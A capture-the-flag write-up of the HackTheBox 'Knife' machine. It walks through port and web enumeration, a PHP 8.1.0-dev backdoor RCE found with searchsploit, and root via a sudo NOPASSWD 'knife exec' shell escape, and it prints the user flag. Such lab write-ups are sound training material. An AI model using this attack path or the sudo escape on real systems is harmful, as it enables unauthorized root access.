---
title: "HackTheBox - Easy - Knife"
date: 2025-11-09 12:00:00 -0000
categories: [CTF, HackTheBox]
tags: [linux, web enum, NOPASSWD, sudo -l]
---

![HackTheBox Knife](/assets/img/ctf/htb/easy/knife/knife.png))

# Initial Intel
* Difficulty: Easy
* OS: Linux

# tl;dr
<details><summary>Spoilers</summary>
* enumerate the full webstack :80 to find a vulnerable software<br/>
* get a revshell using a easy-to-find exploit<br/>
* enumerate the local user, including sudo permssions<br/>
* reference GTFObins for the exploit<br/>
</details>

# Attack Path

## Recon

### Service Enumeration

Standard TCP scan to start. I also did a UDP top 1000 scan, but found nothing there.

```bash
┌──(haunter㉿kali)-[~/working/htb/easy/knife]
└─$ nmap_tcp_full $knife
...
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu)) 
    |_http-title:  Emergent Medical Idea   
```

Notable services:

#### 22/tcp - SSH

No exploits available. Will come back if I enumerate any usernames/passwords.

#### 80/tcp - Webserver

Webserver landing page:

![Webserver Landing Page](/assets/img/ctf/htb/easy/knife/1.png)

Tried some discovery:

```bash
┌──(vEnv)(haunter㉿kali)-[~/working/htb/easy/knife] 
└─$ feroxbuster --url http://$target --depth 3 --wordlist /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt -C 404 -x php,sh,txt,cgi,html,js,css,py,zip,aspx,pdf,docx,doc,md,log,htm,asp,do 
```

Nothing. More recon:

```bash
┌──(haunter㉿kali)-[~/working/htb/easy/knife] 
└─$ whatweb $knife 
http://10.10.10.242 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.242], PHP[8.1.0-dev], Script, Title[Emergent Medical Idea], X-Powered-By[PHP/8.1.0-dev]
```

It's running *PHP 8.1.0-dev*. 

```
┌──(haunter㉿kali)-[~/working/htb/easy/knife]
└─$ searchsploit 8.1.0-dev

PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution                       | php/webapps/49933.py
```

Found a potential exploit.

## Foothold

![Exploit shell](/assets/img/ctf/htb/easy/knife/2.png)

Running it has given as a psuedo-shell as user *james*.

```bash
$ cat /home/james/user.txt 
9d0bf8e2878102e1872bed4313b3d094
```

After getting this flag I had issues upgrading the shell and opted to find a different exploit for a more interactive shell. I found the following exploit:

[PHP 8.1.0-dev exploit](https://github.com/PenTestical/PHP-8.1.0-dev_RCE) and received a better shell.

![Exploit shell Init](/assets/img/ctf/htb/easy/knife/3.png)

![Exploit shell revshell](/assets/img/ctf/htb/easy/knife/4.png)


## Lateral Movement / Privilege Escalation

I continued with additional recond for the current user context.

```bash
james@knife:~$ sudo -l
Matching Defaults entries for james on knife:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
```

NOPASSWD set for */usr/bin/knife*

Verified when I ran linPEAS:

![knife bin](/assets/img/ctf/htb/easy/knife/5.png)

```bash
james@knife:~$ ls -alh /usr/bin/knife  
lrwxrwxrwx 1 root root 31 May  7  2021 /usr/bin/knife -> /opt/chef-workstation/bin/knife
```

## Root / SYSTEM

I checked GTFObins for *knife*:

[GTFObins knife](https://gtfobins.github.io/gtfobins/knife/)

```bash
james@knife:~$ sudo knife exec -E 'exec "/bin/sh"'   
```

![root](/assets/img/ctf/htb/easy/knife/6.png)

Rooted Knife.

# Lessons Learned
* Enumerate a webserver's full stack using tools such as *whatweb*, *wappalyzer*, etc.
* While an exploit MAY work, look for a different version if you have a poor shell and cannot upgrade it
* GTFObins is love. GTFObins is life.

